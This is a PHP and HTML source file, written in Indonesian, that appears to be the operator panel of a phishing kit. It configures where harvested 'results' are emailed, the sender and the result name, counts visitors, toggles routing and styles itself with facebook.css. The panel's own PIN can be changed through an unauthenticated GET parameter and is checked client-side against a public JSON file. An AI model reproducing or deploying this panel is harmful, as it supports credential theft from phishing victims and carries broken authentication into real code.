<?php
// DATA.JSON
$ngGet = file_get_contents("etc/data.json");
$data = json_decode($ngGet,true);
if($data['routing'] == "true"){
   $attr = "checked";
}else{
   $attr = "";
}
// VISITOR.JSON
$ngVis = file_get_contents("etc/visitor.json");
$vis = json_decode($ngVis,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("etc/data.json");
$data = json_decode($ngGet,true);
$data['pin'] = $_GET['change'];
$ngResult = json_encode($data);
$ngFile = fopen('etc/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"> 
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<title>Main Panel</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="stylesheet" type="text/css" href="css/facebook.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<style>
.switch {
  position: relative;
  display: inline-block;
  width: 60px;
  height: 34px;
}

.switch input { 
  opacity: 0;
  width: 0;
  height: 0;
}

.slider {
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #ccc;
  -webkit-transition: .4s;
  transition: .4s;
}

.slider:before {
  position: absolute;
  content: "";
  height: 26px;
  width: 26px;
  left: 4px;
  bottom: 4px;
  background-color: white;
  -webkit-transition: .4s;
  transition: .4s;
}

input:checked + .slider {
  background-color: #2196F3;
}

input:focus + .slider {
  box-shadow: 0 0 1px #2196F3;
}

input:checked + .slider:before {
  -webkit-transform: translateX(26px);
  -ms-transform: translateX(26px);
  transform: translateX(26px);
}

/* Rounded sliders */
.slider.round {
  border-radius: 34px;
}

.slider.round:before {
  border-radius: 50%;
}
</style>
<body>
	<audio autoplay>
	<source src="ngAction/putar.mp3" type="audio/mp3"/>
</audio>
	<section>
		<header>
			<div class="l-icon">
				<i class="fa fa-sun-o" aria-hidden="true"></i>
			</div>
			<h1>PANEL CURL RESULT</h1>
			<div class="r-icon">
				<i class="fa fa-sun-o" aria-hidden="true"></i>
			</div>
		</header>

		<div class="wrap">
			<div class="textBox">
				<h1>WARNING!</h1>
				<p id="quote" style="font-size:15px;">
Pastikan email yang masukan benar agar result masuk dengan lancar</p>
				<span id="by"></span>
			</div>
		
			   <div class="pemberitahuan" style="overflow:hidden;margin-top:10px;padding:2px;">
			  <img style="border-radius:3px;max-width:100%;" src="ngAction/web.jpg">
			  </div>
			
			
			
			<div class="formulir" id="changeEmail" style="display:none;">
				<div class="form-group">
					<span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
					<input type="email" id="ngEmail" class="form-input" placeholder="Masukkan Email Baru" autocomplete="off">
				</div>
				<div style="margin-top:10px;" class="form-group" id="otp-btn">
					<button id="btnEmail" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Email</button>
				</div>
				</div>
				
			
			<div class="formulir" id="changeName" style="display:none;">
				<div class="form-group">
					<span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
					<input type="email" id="ngName" class="form-input" placeholder="Masukkan Nama Baru" autocomplete="off">
				</div>
				<div style="margin-top:10px;" class="form-group" id="otp-btn">
					<button id="btnName" type="submit" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Nama</button>
				</div>
				</div>
			
			<div class="formulir" id="changeSender" style="display:none;">
				<div class="form-group">
					<span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
					<input type="email" id="ngSender" class="form-input" placeholder="Masukkan Sender Baru" autocomplete="off">
				</div>
				<div style="margin-top:10px;" class="form-group" id="otp-btn">
					<button id="btnSender" type="submit" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Sender</button>
				</div>
				</div>

				<div class="formulir" id="changePin" style="display:none;">
				<div class="form-group">
					<span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
					<input type="email" id="ngPin" class="form-input" placeholder="Masukkan Pin Baru" autocomplete="off">
				</div>
				<div style="margin-top:10px;" class="form-group" id="otp-btn">
					<button id="btnPin" type="submit" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Pin</button>
				</div>
				</div>
			
			
			
			
			<div class="pemberitahuan">
			  <div class="visitor">
			   <span class="atas">Hari Ini</span>
			   <span class="bawah"><?php echo $vis['today'];?></span>
			  </div>
			  
			  <div class="visitor">
			  <span class="atas">Kemarin</span>
			   <span class="bawah"><?php echo $vis['yesterday'];?></span>
			  </div>
			  
			  <div class="visitor">
			  <span class="atas">Total</span>
			   <span class="bawah"><?php echo $vis['total'];?></span>
			  </div>
			</div>
			
			<div class="pemberitahuan">
				<span id="cEmail" class="change"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Email Result</span>
				<span id="cName" class="change"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Nama Result</span>
				</div>
			<div class="pemberitahuan2">
				<span id="cSender" class="change2"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Sender</span>
				<span id="cPin" class="change2"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Pin</span>
				</div>
			
			
			
			
			<div class="formulir">
				<div class="form-group">
					<span style="background:#91acda;" class="icon"><i class="fa fa-paper-plane" aria-hidden="true"></i></span>
					<input style="background:#8c96d7;" type="text" class="form-input" id="valName" value="<?php echo $data['nama'];?>" readonly>
				</div>
				
				<div class="form-group">
					<span style="background:#91acda;" class="icon"><i class="fa fa-envelope" aria-hidden="true"></i></span>
					<input style="background:#8c96d7;" type="email" id="valEmail" class="form-input" value="<?php echo $data['email'];?>" readonly>
					<span id="currentResult" style="font-weight:bold;color:#fff;font-family: 'Roboto Slab';height:40px;border-top-right-radius:3px;border-bottom-right-radius:3px;top:0;right:0;position:absolute;padding:10px;background:#0275d8"><?php echo $data['totals'];?></span>
				</div>
				
				<div class="form-group" style="margin-top:10px;">
					<span style="background:#91acda;" class="icon"><i class="fa fa-google" aria-hidden="true"></i></span>
					<input style="background:#8c96d7;" type="email" id="valSender" class="form-input" value="<?php echo $data['sender'];?>" readonly>
				</div>
				
			</div>
			
			
			
			    <style>
			    .pin
			    {
			        position:fixed;
			        top:50%;
			        left:50%;
			        transform:translate(-50%,-50%);
			        width:250px;
			        height:375px;
			        background:#fff;
			        z-index:9999999;
			        justify-content:center;
			        overflow:hidden;
			        border-radius:3px;
			        font-family: Eina03W03-SemiBold;
			    }
			    .pin .atas
			    {
			        position:relative;
			        width:100%;
			    }
			    .atas input
			    {
			        width:100%;
			        height:50px;
			        text-align:center;
			        background:#333;
			        color:#fff;
			        border:2px solid #fff;
			        font-family: Acme;
			        text-transform:uppercase;
			        font-size:2em;
			    }
			    .atas input:focus
			    {
			        outline:none;
			    }
			    .pin .pattern
			    {
			        position:relative;
			        width:100%;
			        padding:5px;
			        display: grid;
	                grid-template-columns: auto auto auto;
	                justify-content: center;
			        
			    }
			    .pattern .box
			    {
			        display:grid;
			        width:75px;
			        height:75px;
			        background:#333;
			        color:#fff;
			        margin:2px;
			        place-items:center;
			        border-radius:3px;
			    }
			    .mask
			    {
			        position:fixed;
			        top:0;
			        left:0;
			        width:100%;
			        height:100%;
			        background:rgba(0,0,0,0.50);
			        backdrop-filter:blur(10px);
			        z-index:999999;
			    }
			    </style>
				<div class="pin">
				    <form name="calc">
				    <div class="atas">
				       <input name="txt" placeholder="enter pin" readonly>
				    </div>
				    <div class="pattern">
				       <div class="box" onclick="pre(1)">1</div>
				       <div class="box" onclick="pre(2)">2</div>
				       <div class="box" onclick="pre(3)">3</div>
				       <div class="box" onclick="pre(4)">4</div>
				       <div class="box" onclick="pre(5)">5</div>
				       <div class="box" onclick="pre(6)">6</div>
				       <div class="box" onclick="pre(7)">7</div>
				       <div class="box" onclick="pre(8)">8</div>
				       <div class="box" onclick="pre(9)">9</div>
				       <div class="box" onclick="pre('*')">*</div>
				       <div class="box" onclick="pre('0')">0</div>
				       <div class="box" onclick="pre('')">Hapus</div>
				    </div>
				    </form>
				</div>
				<div class="mask"></div>
				
				
				
				
			</div>
		
		<div class="refresh" onclick="refresh()">
		<i class="fa fa-refresh fa-spin" style="font-size:24px"></i>
		</div>
		
		
		<div class="refresh" style="width:60px;top:250px;">
		<label class="switch">
  <input id="set" type="checkbox" onclick="set(this)"><?php echo $attr;?>
  <span class="slider round"></span>
</label>
		</div>
		
	</section>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
	<script type="text/javascript">
	    function pre(e)
	    {
	       var k = document.calc.txt.value;
	       if(k.length >= 4){
	       if(e == ""){
	       document.calc.txt.value = "";
	       }
	         return false;
	       }else{
	       if(e == ""){
	       document.calc.txt.value = "";
	       }else{
	       document.calc.txt.value +=e;
	       }
	       }
	       duitBro();
	    }
		function refresh()
		{
		   location.reload();
		}
		function duitBro()
		{
		var val = document.calc.txt.value;
		if(val.length >= 4){
		$.getJSON("etc/data.json",function(data){
                   if(data.pin == val){
                   document.calc.txt.value = "Pin Benar";
                   setTimeout(() => {
                   $(".pin").hide();
                   $(".mask").hide();
                   },1000);
                   }else{
                   document.calc.txt.value = "Pin Salah";
                   setTimeout(() => {
                   document.calc.txt.value = "";
                   },1000);
                   }
                   })
             }
		}
    </script>
    <script>
        $("#cEmail").click(function(){
           $("#changeEmail").fadeIn();
           $("#changeName").hide();
           $("#changeSender").hide();
           $("#changePin").hide();
        })
        $("#cName").click(function(){
           $("#changeEmail").hide();
           $("#changeName").fadeIn();
           $("#changeSender").hide();
           $("#changePin").hide();
        })
        $("#cSender").click(function(){
           $("#changeEmail").hide();
           $("#changeName").hide();
           $("#changeSender").fadeIn();
           $("#changePin").hide();
        })
        $("#cPin").click(function(){
           $("#changeEmail").hide();
           $("#changeName").hide();
           $("#changeSender").hide();
           $("#changePin").fadeIn();
        })
    </script>
    <script>
        $("#btnEmail").click(function(){
           var ngEmail = $("#ngEmail").val();
           $.post("ngAction/UpdateData.php",{
                          email:ngEmail
                  },function(ngE){
                   if(ngE = "Sukses"){
                   $("#valEmail").val(ngEmail);
                   $("#currentResult").html(0);
                   }
                  })
        })
        
        $("#btnName").click(function(){
           var ngName = $("#ngName").val();
           $.post("ngAction/UpdateData.php",{
                          nama:ngName
                  },function(ngE){
                   if(ngE = "Sukses"){
                   $("#valName").val(ngName);
                   }
                  })
        })
        
        $("#btnSender").click(function(){
           var ngSender = $("#ngSender").val();
           $.post("ngAction/UpdateData.php",{
                          sender:ngSender
                  },function(ngE){
                   if(ngE = "Sukses"){
                   $("#valSender").val(ngSender);
                   }
                  })
        })
        $("#btnPin").click(function(){
           var ngPin = $("#ngPin").val();
           $.post("ngAction/UpdateData.php",{
                          pin:ngPin
                  },function(ngE){
                   if(ngE = "Sukses"){
                   $("#valPin").val(ngPin);
                   }
                  })
        })
    </script>
    <script>
    function set(e){
       e.disabled = true;
       if(e.checked == true){
        setTimeout(() => {
        const a = document.querySelector("#set");
        $.post("ngAction/UpdateData.php",{
                          routing:'true'
                  },function(ngE){
                   if(ngE = "Sukses"){
                   a.disabled = false;
                   alert('Routing Dihidupkan');
                   }
                  })
        },1000);
       }
       if(e.checked == false){
        setTimeout(() => {
        const a = document.querySelector("#set");
        $.post("ngAction/UpdateData.php",{
                          routing:'false'
                  },function(ngE){
                   if(ngE = "Sukses"){
                   a.disabled = false;
                   alert('Routing Dimatikan');
                   }
                  })
        },1000);
       }
    }
</script>
</html>
